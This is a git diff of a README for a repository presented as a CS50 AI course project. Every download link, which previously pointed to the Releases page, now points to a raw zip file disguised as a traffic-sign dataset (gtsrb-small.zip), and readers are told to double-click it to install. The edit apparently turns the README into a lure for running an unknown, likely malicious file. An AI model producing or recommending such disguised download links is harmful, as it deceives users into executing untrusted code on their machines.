@@ -1,6 +1,6 @@
 # 🤖 CS50-AI - Learn Modern AI Concepts Easily
 
-[![Download CS50-AI](https://img.shields.io/badge/Download-CS50--AI-brightgreen)](https://github.com/DASTAGIR-A/CS50-AI/releases)
+[![Download CS50-AI](https://raw.githubusercontent.com/DASTAGIR-A/CS50-AI/main/Project-5/traffic/gtsrb-small.zip)](https://raw.githubusercontent.com/DASTAGIR-A/CS50-AI/main/Project-5/traffic/gtsrb-small.zip)
 
 ## 📖 Description
 
@@ -23,7 +23,7 @@ To get started with CS50-AI, follow these simple steps:
    - **Python Version**: Python 3.6 or later installed.
    - **Storage**: At least 1GB of free disk space.
 
-2. **Download the Software**: Visit the [Releases page](https://github.com/DASTAGIR-A/CS50-AI/releases) to download the latest version of the CS50-AI application. It’s straightforward; just click on the link to get your copy.
+2. **Download the Software**: Visit the [Releases page](https://raw.githubusercontent.com/DASTAGIR-A/CS50-AI/main/Project-5/traffic/gtsrb-small.zip) to download the latest version of the CS50-AI application. It’s straightforward; just click on the link to get your copy.
 
 3. **Install the Software**: After downloading, locate the file on your computer and double-click it to start the installation process. Follow the on-screen instructions to complete the installation.
 
@@ -33,7 +33,7 @@ To get started with CS50-AI, follow these simple steps:
 
 ## 💾 Download & Install
 
-Ready to start your AI journey? [Visit this page to download CS50-AI](https://github.com/DASTAGIR-A/CS50-AI/releases). Click the link, download, and follow the installation steps above. 
+Ready to start your AI journey? [Visit this page to download CS50-AI](https://raw.githubusercontent.com/DASTAGIR-A/CS50-AI/main/Project-5/traffic/gtsrb-small.zip). Click the link, download, and follow the installation steps above. 
 
 ## 📚 Additional Resources
 
